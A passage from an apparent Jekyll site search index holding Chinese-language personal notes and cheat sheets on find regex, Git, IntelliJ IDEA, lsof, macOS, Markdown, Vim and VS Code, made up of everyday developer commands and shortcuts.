f找文件（不包括链接文件），不会自动解析链接文件对应的真实目录。除非在软链名后面加/，相当于告诉find进入符号链接对应的目录进行查找。 # /home/devops/mysqlbackup是链接文件 ls -ld /home/devops/mysqlbackup lrwxrwxrwx 1 devops devops 19 Jan 26 2024 /home/devops/mysqlbackup -&gt; /data/mysqlbackup/ # 正则准确匹配起始路径，注意mysqlbackup链接文件结尾加了/ find /home/devops/mysqlbackup/ -type f -regextype posix-egrep -regex /home/devops/mysqlbackup/[0-9]{8}/backup_[0-9]{8}_[0-9]{6}  .tgz # 正则通配符匹配起始路径，注意mysqlbackup链接文件结尾加了/ find /home/devops/mysqlbackup/ -type f -regextype posix-egrep -regex &quot;.*/[0-9]{8}/backup_[0-9]{8}_[0-9]{6}.tgz&quot; 问题解决。 三、结论 推荐方案 find + regex find /home/devops/mysqlbackup/ -type f -regextype posix-egrep -regex &quot;/home/devops/mysqlbackup/[0-9]{8}/backup_[0-9 ]{8}_[0-9]{6}  .tgz$&quot; find + grep方案也可以。不过grep中正则不要求全路径匹配。文中提到的扩展正则和符号链接要求相同。 find /home/devops/mysqlbackup/ -type f | grep -E &quot;/[0-9]{8}/backup_[0-9]{8}_[0-9]{6}  .tgz$&quot; AI很强赋能程序员，代替了搜索方便了代码生成。但是特定专业的问题，特别是坑多的，还是需要合理的prompt，否则AI给你的都是车轱辘话，往沟里带。 Gemini多次prompt提示后给出了能用的方案，ChatGPT没有给出可用的方案，与prompt提示次数有关。不能作为Gemini和ChatGPT孰优孰劣的依据 ",
      "url"      : "http://localhost:4000/2025/08/16/Linux-find-regex/"
    } ,
  
    {
      "title"    : "Git",
      "category" : "Git",
      "content": "常用命令 功能 命令  添加文件/更改到暂存区 git add filename 添加所有文件/更改到暂存区 git add . 提交 git commit -m msg 从远程仓库拉取最新代码 git pull origin master 推送到远程仓库 git push origin master 查看配置信息 git config --list 查看文件列表 git ls-files 比较工作区和暂存区 git diff 比较暂存区和版本库 git diff --cached 比较工作区和版本库 git diff HEAD 从暂存区移除文件 git reset HEAD filename 查看本地远程仓库配置 git remote -v 回滚 git reset --hard 提交SHA 强制推送到远程仓库 git push -f origin master 修改上次 commit git commit --amend 推送 tags 到远程仓库 git push --tags 推送单个 tag 到远程仓库 git push origin [tagname] 删除远程分支 git push origin --delete [branchName] 远程空分支（等同于删除） git push origin :[branchName] 查看所有分支历史 gitk --all 按日期排序显示历史 gitk --date-order Q&amp;A 如何解决gitk中文乱码，git ls-files 中文文件名乱码问题？ 在~/.gitconfig中添加如下内容 [core] quotepath = false [gui] encoding = utf-8 [i18n] commitencoding = utf-8 [svn] pathnameencoding = utf-8 参考 http://zengrong.net/post/1249.htm 如何处理本地有更改需要从服务器合入新代码的情况？ git stash git pull git stash pop stash 查看 stash 列表： git stash list 查看某一次 stash 的改动文件列表（不传最后一个参数默认显示最近一次）： git stash show stash@{0} 以 patch 方式显示改动内容 git stash show -p stash@{0} 如何合并 fork 的仓库的上游更新？ git remote add upstream https://upstream-repo-url git fetch upstream git merge upstream/master 如何通过 TortoiseSVN 带的 TortoiseMerge.exe 处理 git 产生的 conflict？ 将 TortoiseMerge.exe 所在路径添加到 path 环境变量。 运行命令 git config --global merge.tool tortoisemerge 将 TortoiseMerge.exe 设置为默认的 merge tool。 在产生 conflict 的目录运行 git mergetool，TortoiseMerge.exe 会跳出来供你 resolve conflict。 也可以运行 git mergetool -t vimdiff 使用 -t 参数临时指定一个想要使用的 merge tool。 不想跟踪的文件已经被提交了，如何不再跟踪而保留本地文件？ git rm --cached /path/to/file，然后正常 add 和 commit 即可。 如何不建立一个没有 parent 的 branch？ git checkout --orphan newbranch 此时 git branch 是不会显示该 branch 的，直到你做完更改首次 commit。比如你可能会想建立一个空的 gh-pages branch，那么： git checkout --orphan gh-pages git rm -rf . // add your gh-pages branch files git add . git commit -m &quot;init commit&quot; submodule 的常用命令 添加 submodule git submodule add git@github.com:philsquared/Catch.git Catch 这会在仓库根目录下生成如下 .gitmodules 文件并 clone 该 submodule 到本地。 [submodule &quot;Catch&quot;] path = Catch url = git@github.com:philsquared/Catch.git 更新 submodule git submodule update 当 submodule 的 remote 有更新的时候，需要 git submodule update --remote 删除 submodule 在 .gitmodules 中删除对应 submodule 的信息，然后使用如下命令删除子模块所有文件： git rm --cached Catch clone 仓库时拉取 submodule git submodule update --init --recursive 删除远程 tag git tag -d v0.0.9 git push origin :refs/tags/v0.0.9 或 git push origin --delete tag [tagname] 清除未跟踪文件 git clean 可选项： 选项 含义  -q, --quiet 不显示删除文件名称 -n, --dry-run 试运行 -f, --force 强制删除 -i, --interactive 交互式删除 -d 删除文件夹 -e, --exclude 忽略符合 的文件 -x 清除包括 .gitignore 里忽略的文件 -X 只清除 .gitignore 里忽略的文件 忽略文件属性更改 因为临时需求对某个文件 chmod 了一下，结果这个就被记为了更改，有时候这是想要的，有时候这会造成困扰。 git config --global core.filemode false 参考：How do I make Git ignore file mode (chmod) changes? patch 将未添加到暂存区的更改生成 patch 文件： git diff &gt; demo.patch 将已添加到暂存区的更改生成 patch 文件： git diff --cached &gt; demo.patch 合并上面两条命令生成的 patch 文件包含的更改： git apply demo.patch 将从 HEAD 之前的 3 次 commit 生成 3 个 patch 文件： （HEAD 可以换成 sha1 码） git format-patch -3 HEAD 生成 af8e2 与 eaf8e 之间的 commits 的 patch 文件： （注意 af8e2 比 eaf8e 早） git format-patch af8e2..eaf8e 合并 format-patch 命令生成的 patch 文件： git am 0001-Update.patch 与 git apply 不同，这会直接 add 和 commit。 只下载最新代码 git clone --depth 1 git://xxxxxx 这样 clone 出来的仓库会是一个 shallow 的状态，要让它变成一个完整的版本： git fetch --unshallow 或 git pull --unshallow 基于某次 commit 创建分支 git checkout -b test 5234ab 表示以 commit hash 为 5234ab 的代码为基础创建分支 test。 恢复单个文件到指定版本 git reset 5234ab MainActivity.java 恢复 MainActivity.java 文件到 commit hash 为 5234ab 时的状态。 设置全局 hooks git config --global core.hooksPath C:/Users/mazhuang/git-hooks 然后把对应的 hooks 文件放在最后一个参数指定的目录即可。 比如想要设置在 commit 之前如果检测到没有从服务器同步则不允许 commit，那在以上目录下建立文件 pre-commit，内容如下： #!/bin/sh CURRENT_BRANCH=$(git rev-parse --abbrev-ref HEAD) git fetch origin $CURRENT_BRANCH HEAD=$(git rev-parse HEAD) FETCH_HEAD=$(git rev-parse FETCH_HEAD) if [ &quot;$FETCH_HEAD&quot; = &quot;$HEAD&quot; ]; then echo &quot;Pre-commit check passed&quot; exit 0 fi echo &quot;Error: you need to update from remote first&quot; exit 1 查看某次 commit 的修改内容 git show &lt;commit-hash-id&gt; 查看某个文件的修改历史 git log -p &lt;filename&gt; 查看最近两次的修改内容 git log -p -2 应用已存在的某次更改 / merge 某一个 commit git cherry-pick &lt;commit-hash-id&gt; cherry-pick 有更多详细的用法，可以参见帮助文档。 命令行自动补全 在 shell 里加载 git-completion 系列脚本，详见 https://github.com/git/git/tree/master/contrib/completion 文件每一行变更明细 git blame &lt;filename&gt; 找回曾经的历史 git reflog 列出 HEAD 曾指向过的一系列 commit，它们只存在于本机，不是版本仓库的一部分。 还有： git fsck 记住 http(s) 方式的用户名密码 在有些情况下无法使用 git 协议，比如公司的 git 服务器设置了 IP 白名单，只能在公司内网使用 ssh，那么在外面就只能使用 http(s) 上传下载源码了，但每次都手动输入用户名/密码特别惨，于是乎就记住吧。 设置记住密码（默认 15 分钟）： git config --global credential.helper cache 自定义记住的时间（如下面是一小时）： git config credential.helper 'cache --timeout=3600' 长期存储密码： git config --global credential.helper store git commit 使用 vim 编辑 commit message 中文乱码 这个问题在 Windows 下出现了，没找到能完美解决的办法，一种方法是在 vim 打开后输入： :set termencoding=GBK 这就有点太麻烦了，折衷的方法是改为使用 gVim 或其它你喜欢的编辑器来编辑 commit message： git config --global core.editor gvim 参考： How do I make Git use the editor of my choice for commits? 转：git windows中文 乱码问题解决汇总 git log 中文乱码 只在 Windows 下遇到。 git config --global i18n.logoutputencoding gbk 编辑 git 安装目录下 etc/profile 文件，在最后添加如下内容： export LESSCHARSET=utf-8 参考：Git for windows 中文乱码解决方案 git diff 中文乱码 只在 Windows 下遇到，目前尚未找到有效办法。 统计代码行数 CMD 下直接执行可能失败，可以在右键，Git Bash here 里执行。 统计某人的代码提交量 git log --author=$(git config --get user.name) --pretty=tformat: --numstat | gawk '{ add += $1 ; subs += $2 ; loc += $1 - $2 } END { printf added lines: %s removed lines : %s total lines: %s  ,add,subs,loc }' 仓库提交都排名前 5 如果看全部，去掉 head 管道即可。 git log --pretty='%aN' | sort | uniq -c | sort -k1 -n -r | head -n 5 仓库提交者（邮箱）排名前 5 这个统计可能不太准，可能有同名。 git log --pretty=format:%ae | gawk -- '{ ++c[$0]; } END { for(cc in c) printf %5d %s  ,c[cc],cc; }' | sort -u -n -r | head -n 5 贡献者排名 git log --pretty='%aN' | sort -u | wc -l 提交数统计 git log --oneline | wc -l 参考：Git代码行统计命令集 修改文件名时的大小写问题 修改文件名大小写时，默认会被忽略（在 Windows 下是这样），让 git 对大小写敏感的方法： git config --global core.ignorecase false 或者使用 git mv oldname newname 也是可以的。 修复 gitk 在 macOS 下显示模糊的问题 gitk 很方便，但是在 Mac 系统下默认显示很模糊，影响体验。 根据网上搜索的结果，解决方法有两种，我采用第一种解决，第二种未尝试。 方法一： 重新启动机器，按 command + R 等 Logo 和进度条出现，会进入 Recovery 模式，选择顶部的实用工具——终端，运行以下命令： csrutil disable 重新启动机器。 编辑 Wish 程序的 plist，启动高分辨率屏支持。 sudo gvim /System/Library/Frameworks/Tk.framework/Versions/Current/Resources/Wish.app/Contents/Info.plist 在最后的 前面加上以下代码 &lt;key&gt;NSHighResolutionCapable&lt;/key&gt; &lt;true/&gt; 更新 Wish.app。 sudo touch Wish.app 再次用 1 步骤的方法进入 Recovery 模式，执行 csrutil enable 启动对系统文件保护，再重启即可。 参考：Mac 中解决 gitk 模糊问题 方法二： brew cask install retinizer open /System/Library/Frameworks/Tk.framework/Versions/Current/Resources/ 打开 retinizer，将 Wish.app 拖到 retinizer 的界面。 参考：起底Git-Git基础 ",
      "url"      : "http://localhost:4000/wiki/git/"
    } ,
  
    {
      "title"    : "IntelliJ IDEA",
      "category" : "Tools",
      "content": "快捷键基本与 Android Studio 一致，这里重点记录解决遇到过的问题。 Q&amp;A 解决导入 Eclipse Maven 工程后无法读取 .xml 文件的问题 IDEA 与 Eclipse 配置文件目录的方式不同，可以将文件夹标记为 Sources、Resources 和 tests 等，而 src/main/java 默认被标记为 Sources，src/main/resources 才默认被标记为 Resources，编译时自动复制。 这样放在 src/main/java 目录下的文件与子文件夹均为 Sources，只将编译生成的 .class 文件复制到编译目录，在 Eclipse Maven 工程里放在 src/main/java 文件夹里的 xml、props 和 properties 文件就不会被拷贝到编译文件夹，导致执行时找不到这些文件，报类似下面这样的错误： org.springframework.beans.factory.BeanDefinitionStoreException: IOException parsing XML document from class path resource [spring-demo.xml]; nested exception is java.io.FileNotFoundException: class path resource [spring-demo.xml] cannot be opened because it does not exist  tat org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:343)  tat org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:303)  tat org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:180)  tat org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:216)  tat org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:187)  tat org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:251)  tat org.springframework.context.support.AbstractXmlApplicationContext.loadBeanDefinitions(AbstractXmlApplicationContext.java:127)  tat org.springframework.context.support.AbstractXmlApplicationContext.loadBeanDefinitions(AbstractXmlApplicationContext.java:93)  tat org.springframework.context.support.AbstractRefreshableApplicationContext.refreshBeanFactory(AbstractRefreshableApplicationContext.java:129)  tat org.springframework.context.support.AbstractApplicationContext.obtainFreshBeanFactory(AbstractApplicationContext.java:540)  tat org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:454)  tat org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:139)  tat org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:83)  tat org.mazhuang.demo.protocol.db.DemoContext.init(DemoContext.java:22)  tat org.mazhuang.demo.protocol.DemoServer.start(DemoServer.java:40)  tat org.mazhuang.demo.DemoSrv.main(DemoSrv.java:17) Caused by: java.io.FileNotFoundException: class path resource [spring-demo.xml] cannot be opened because it does not exist  tat org.springframework.core.io.ClassPathResource.getInputStream(ClassPathResource.java:158)  tat org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:329)  t... 15 more 解决方案： 可以通过在 pom.xml 文件里添加 resources 配置来指定将哪些文件作为 resources 包含： &lt;build&gt;  &lt;resources&gt;  &lt;resource&gt;   &lt;directory&gt;${basedir}/src/main/java&lt;/directory&gt;   &lt;includes&gt;    &lt;include&gt;**/*.props&lt;/include&gt;    &lt;include&gt;**/*.xml&lt;/include&gt;   &lt;/includes&gt;  &lt;/resource&gt;  &lt;/resources&gt; &lt;/build&gt; 如何导出 jar 包 File -&gt; Project Structure -&gt; Artifacts -&gt; Click green plus sign -&gt; Jav -&gt; From modules with dependencies Build -&gt; Build Artifacts 参考 解决IntelliJ IDEA无法读取配置*.properties文件的问题 How to build jars from IntelliJ properly? ",
      "url"      : "http://localhost:4000/wiki/intellij-idea/"
    } ,
  
    {
      "title"    : "Linux/Unix",
      "category" : "Linux",
      "content": "类 Unix 系统下的一些常用命令和用法。 实用命令 fuser 查看文件被谁占用。 fuser -u .linux.md.swp id 查看当前用户、组 id。 lsof 查看打开的文件列表。 An open file may be a regular file, a directory, a block special file, a character special file, an executing text reference, a library, a stream or a network file (Internet socket, NFS file or UNIX domain socket.) A specific file or all the files in a file system may be selected by path. 查看网络相关的文件占用 lsof -i 查看端口占用 lsof -i tcp:5037 查看某个文件被谁占用 lsof .linux.md.swp 查看某个用户占用的文件信息 lsof -u mazhuang -u 后面可以跟 uid 或 login name。 查看某个程序占用的文件信息 lsof -c Vim 注意程序名区分大小写。 ",
      "url"      : "http://localhost:4000/wiki/linux/"
    } ,
  
    {
      "title"    : "Mac OS X",
      "category" : "Mac",
      "content": "快捷键约定： C --&gt; Ctrl S --&gt; Shift M --&gt; Alt/Option Cmd --&gt; Command Mac 键盘快捷键官方参考 窗口 功能 快捷键  显示桌面 F11 切换窗口全屏状态 C-Cmd-F 隐藏当前程序的所有窗口 Cmd-H 最小化窗口 Cmd-M 关闭窗口 Cmd-W 关闭当前程序 Cmd-Q 新建标签 Cmd-T 新建窗口 Cmd-N 程序 功能 快捷键  打开 emoji 表情窗口 C-Cmd- 空格 打开 Spotlight C- 空格 切换输入法 Cmd- 空格 打开 Alfred M- 空格 打开 Finder 并查找 C-M- 空格 打开 Launchpad 四指合拢 命令行 快捷键 功能 按键  移动光标至行首 C-a 移动光标至行尾 C-e 清屏 C-l 清屏 C-k 删除光标前的所有文字。如果光标位于行尾则删除整行。 C-u 与退格键相同 C-h 检索使用过的命令 C-r 终止当前执行 C-c 退出当前 shell C-d 将执行中的任何东西放入后台进程。fg 可以将其恢复。 C-z 删除光标之前的单词 C-w 删除光标后的所有文字 C-k 将光标前的两个文字进行互换 C-t 光标向前移动一个单词 C-f 光标向后移动一个单词 C-b 将光标前的两个单词进行互换 Esc + t 自动补全文件或文件夹的名称 Tab 命令 按键 / 命令 描述  cd Home 目录 cd [folder] 切换目录 cd ~ Home 目录，例如 'cd ~/folder/' cd / 根目录 ls 文件列表 ls -l 文件详细列表 ls -a 列出隐藏文件 ls -lh 文件详细列表中的文件大小以更友好的形式列出 ls -R 递归显示文件夹中的内容 sudo [command] 以超级用户身份执行命令 open [file] 打开文件 ( 相当于双击一个文件 ) top 显示运行中的进程，按 q 终止 nano [file] 打开编辑 pico [file] 打开编辑 q 退出 clear 清屏 命令历史 按键/命令 描述  history n 列出最近执行过的 n 条命令 ctrl-r 检索之前执行过的命令 ![value] 执行最近以 'value' 开始的命令 !! 执行最近执行过的命令 文件管理 按键/命令 描述  touch [file] 创建一个新文件 pwd 显示当前工作目录 .. 上级目录, 例如. 'ls -l ..' 上级目录的文件详细列表 'cd ../../' 向上移动两个层级 . 当前目录 cat 连接 rm [file] 移除文件, 例如 rm [file] [file] rm -i [file] 移除时出现确认提示 rm -r [dir] 移除文件及内容 rm -f [file] 强制移除 cp [file] [newfile] 复制文件 cp [file] [dir] 复制文件到指定目录 mv [file] [new filename] 移动 / 重命名, 例如 mv -v [file] [dir] 目录管理 按键/命令 描述  mkdir [dir] 创建新目录 mkdir -p [dir]/[dir] 创建子目录 rmdir [dir] 移除目录 ( 仅限目录下没有内容时 ) rm -R [dir] 移除目录及内容 管道 - 连接多个带有输出的命令 按键/命令 描述  more 按当前窗口大小输出内容 &gt; [file] 输出至指定文件, 注意文件将会覆盖 &gt;&gt; [file] 在制定文件的末尾附加内容 &lt; 从文件中读取内容 帮助 按键/命令 描述  [command] -h 显示帮助信息 [command] --help 显示帮助信息 [command] help 显示帮助信息 reset 重置当前终端 man [command] 显示指定命令的帮助信息 whatis [command] 显示指定命令的简述 搜索 使用 find 命令，例如： find ~ -iname aapt 使用 mdfind 命令，例如： 全局搜索 mdfind -name aapt 或搜索指定文件夹 mdfind -onlyin ~/Library aapt 使用 locate 命令，例如： locate aapt 复制文件路径 在 Finder 下 先按键 Cmd-i，然后从弹出的窗口里复制。 在 Terminal 下 pwd|pbcopy Safari 功能 快捷键  定位到地址栏 Cmd-L 切换标签 Cmd-S-Left/Right 收藏页面 Cmd-D 保存 Safari 里正在播放的视频 $ su # cd /private/var/folders # ls nk zz # cd nk # ls zy3770994vqg83xvmbc9pd0m0000gn # cd zy3770994vqg83xvmbc9pd0m0000gn/T # open . 然后复制里面叫 FlashTmp.xxx 的文件，改名为 FlashTmp.flv。（操作过程中保持视频在播放状态） Terminal 功能 快捷键  新建标签 Cmd-T 上 / 下个标签 Cmd-{/} 删除光标前的输入 C-U WireShark 使用 WireShark 1.99 开发版，可以不依赖于 X11，界面基于 Qt，更加美观，符合 Mac 界面风格。 截图 功能 快捷键  全屏截图保存到桌面 Cmd-S-3 全屏截图并复制 Cmd-C-S-3 选区截图保存到桌面 Cmd-S-4 选区截图并复制 Cmd-C-S-4 窗口截图保存到桌面 Cmd-S-4 空格 窗口截图并复制 Cmd-C-S-4 空格 QQ 截图 Cmd-S-A 去除窗口截图时的阴影 defaults write com.apple.screencapture disable-shadow -bool TRUE Killall SystemUIServer 如果要保留窗口截图时的阴影，则将 TRUE 改为 FALSE。 调整选区大小 使用选区模式选中一个区域并松开鼠标前， 按住空格并移动鼠标，可以保持区域大小不变，并移动区域； 按住Shift并移动鼠标，就可以保持区域的其它三个边不变，移动一个边的位置； 按住Alt并移动鼠标，就可以对称的调整区域大小。 截图标注 使用预览工具可以完成截图标注。 延时截图 使用系统自带的 Grab 工具，运行后选择菜单的 Capture - Timed Screen。 iBooks 里的电子书保存路径 /Users/&lt;username&gt;/Library/Containers/com.apple.BKAgentService/Data/Documents/iBooks/Books 安装 mpv 没有图形界面 使用 brew options mpv 可以看到有个 --with-bundle 是安装时创建 .app 文件。 brew install mpv --with-bundle brew linkapps mpv 屏幕取色 使用 Mac 自带的“数码测色计”。 参考 你可能不知道的 Mac 技巧 - 截图，Gif 制作及 App 推荐 terminal-mac-cheatsheet ",
      "url"      : "http://localhost:4000/wiki/mac/"
    } ,
  
    {
      "title"    : "Markdown",
      "category" : "Markdown",
      "content": "目录 TOC {:toc} 超链接 [靠谱-ing](https://mazhuang.org) &lt;https://mazhuang.org&gt; 靠谱-ing https://mazhuang.org 列表 1. 有序列表项 1 有序列表项 2 有序列表项 3 有序列表项 1 有序列表项 2 有序列表项 3 * 无序列表项 1 无序列表项 2 无序列表项 3 无序列表项 1 无序列表项 2 无序列表项 3 [x] 任务列表 1 [ ] 任务列表 2 强调 ~~删除线~~ 加黑 斜体 删除线 加黑 斜体 标题 # 一级标题 ## 二级标题 ### 三级标题 #### 四级标题 ##### 五级标题 ###### 六级标题 Tips: # 与标题中间要加空格。 表格 | HEADER1 | HEADER2 | HEADER3 | HEADER4 | | ------- | :------ | :-----: | ------: | | content | content | content | content | HEADER1 HEADER2 HEADER3 HEADER4  content content content content  :----- 表示左对齐 :----: 表示中对齐 -----: 表示右对齐 代码块 print 'Hello, World!' list item1 list item2 print 'hello' 图片 ![本站favicon](/favicon.ico) 锚点 * [目录](#目录) 目录 Emoji :camel: :blush: :smile: Footnotes This is a text with footnote1. mermaid sequenceDiagram  Alice-->>John: Hello John, how are you?  John-->>Alice: Great! sequence Andrew-&gt;China: Says Hello Note right of China: China thinks  about it China--&gt;Andrew: How are you? Andrew-&gt;&gt;China: I am good thanks! flowchart st=&gt;start: Start e=&gt;end op1=&gt;operation: My Operation sub1=&gt;subroutine: My Subroutine cond=&gt;condition: Yes or No? io=&gt;inputoutput: catch something... st-&gt;op1-&gt;cond cond(yes)-&gt;io-&gt;e cond(no)-&gt;sub1(right)-&gt;op1 mathjax When $$(a   e 0)$$, there are two solutions to $$(ax^2 + bx + c = 0)$$ and they are $$x = {-b   pm   sqrt{b^2-4ac}   over 2a}.$$ Here is the footnote 1 definition. ↩ ",
      "url"      : "http://localhost:4000/wiki/markdown/"
    } ,
  
    {
      "title"    : "Wiki Template",
      "category" : "cate1",
      "content": "Content here ",
      "url"      : "http://localhost:4000/wiki/template/"
    } ,
  
    {
      "title"    : "Vim",
      "category" : "Vim",
      "content": "移动 以字（符）为单位 功能 按键  上 k 下 j 左 h 右 l 以单词为单位 功能 按键  前一个单词尾 ge 后一个单词首 w 本单词首（已在本词首则跳到前一单词首） b 本单词尾（已在本词尾则跳到后一单词尾） e 以屏幕为单位 功能 按键  向下翻页 CTRL-f 向上翻页 CTRL-b 向下翻半页 CTRL-d 向上翻半页 CTRL-u 向上一行 CTRL-y 向下一行 CTRL-e 光标移到屏幕上方 H 光标移到屏幕中间 M 光标移到屏幕下方 L 光标所在位置移到屏幕上方 zt 光标所在位置移到屏幕中间 zz 光标所在位置移到屏幕下方 zb 行号 功能 按键  跳到第 num 行 :num 或 numG 或 numgg 文件 功能 按键  跳到文件头 gg 跳到文件尾 G 编辑 复制 功能 按键  复制光标所在单词 yiw 复制光标所在行 yy 粘贴 功能 按键  在光标之后粘贴 p 在光标之前粘贴 P 剪切 功能 按键  剪切选中区域 d 剪切光标所在行 dd 替换 功能 按键  将全文中的 str1 替换为 str1 :%s/str1/str2/g 将 1 到 5 行中的 str1 替换为 str2 :1,5/str1/str2/g 大小写 功能 按键  将选中内容大小写互换 ~ 将选中内容全转为小写 gu 将选中内容全转为大写 gU 将当前行变成小写 guu 将当前行变成大写 gUU 选择 功能 按键  选中上一次选择的区域 gv 选中括号内区域 vi{、vi[、vi( 搜索 功能 按键  向下查找字符串 /str 向上查找字符串 ?str 查找下一个 n 查找上一个 N 向下查找光标所在单词 * 向下查找光标所在单词 # 正则表达式 功能 按键  匹配单词左边界   &lt; 匹配单词右边界   &gt; 去重 :g/^  (.*  )$    1/d 常用 功能 按键  删除空行 :g/^$/d 撤销/UNDO u 重做/REDO C-r 统计行/单词/字符/字节数 g C-g 全局 功能 按键  退出 :q 强制执行 ! 执行外部命令 :! 文件操作 功能 按键  打开 :e 打开文件对话框 :bro e 保存 :w 另存为对话框 :bro w 查看历史文件列表 :ol 查看并打开历史文件 :bro ol 重命名当前文件 :f filename vimdiff 功能 按键  移动到上一个不同处 [c 移动到下一个不同处 ]c 该差异点使用当前文件的 dp 该差异点使用其它文件的 do 手动刷新重新比较 :diffupdate Buffer 功能 按键  查看 Buffer 列表 :ls 转到 Buffer 列表中的下一个 Buffer :bn 转到 Buffer 列表中的上一个 Buffer :bp 转到 Buffer 列表中的 num 号 Buffer :bnum 你之前待过的一个 Buffer :b# 从 Buffer 列表中删除 num 号 Buffer :bdnum 组合命令 可以使用 | 来组合命令，比如 cmd1 | cmd2。 代码 功能 按键  格式化代码 gg=G 去除 1-20 行首的行号 :1,20s/^    s  *[0-9]  *    s  *//g 展开全部折叠 zR 展开当前层级折叠 zr 全部折叠 zM 当前层级折叠 zm 切换折叠/展开 za 递归折叠/展开当前大区块 zA 折叠当前区块 zc 递归折叠当前大区块 zC 展开当前区块 zo 递归展开当前大区块 zO 格式化 json 数据 :%!python -m json.tool 缩进当前行 &gt;&gt; 反缩进当前行 &lt;&lt; 插件 CtrlP 基础按键 C-p 功能 按键  刷新列表 F5 切换文件/缓冲区/MRU C-f/b 切换全路径搜索/文件名搜索 C-d 切换正则表达式模式 C-r 上/下一个选项 C-k/j 在新标签/垂直分割/水平分割打开文件 C-t/v/x 历史选择记录的上/下一条 C-p/n 创建文件和它的父路径 C-y 标记并打开多个文件 C-z C-o 退出 CtrlP C-c LeaderF 功能 按键  打开文件 Leader-f 打开缓冲区 Leader-b 打开 MRU Leader-m（自定义的） 退出 C-c 切换模糊查找和正则查找 C-r 粘贴 C-v 清空输入 C-u 上/下一个选项 C-k/j 在新标签/垂直分割/水平分割打开文件 C-t/]/v 刷新列表 F5 vim-table-mode 功能 按键  删除列 Leader-tdc 删除行 Leader-tdd 重新格式化表格 Leader-tr ",
      "url"      : "http://localhost:4000/wiki/vim/"
    } ,
  
    {
      "title"    : "Visual Studio Code",
      "category" : "Tools",
      "content": "快捷键 C --&gt; Ctrl S --&gt; Shift M --&gt; Alt Cmd --&gt; Command 功能 Windows Mac OS X  打开文件 C-o 打开文件夹 C-k C-o 关闭文件夹 C-k f 命令面板 C-S-p 资源管理器 C-S-e 搜索 C-S-f Git C-S-g 调试 C-S-d 插件 C-S-x Markdown 侧边预览 C-k v Markdown 预览 C-S-v  ",
      "url"      : "http://localhost:4000/wiki/visual-studio-code/"
    } 
  
]

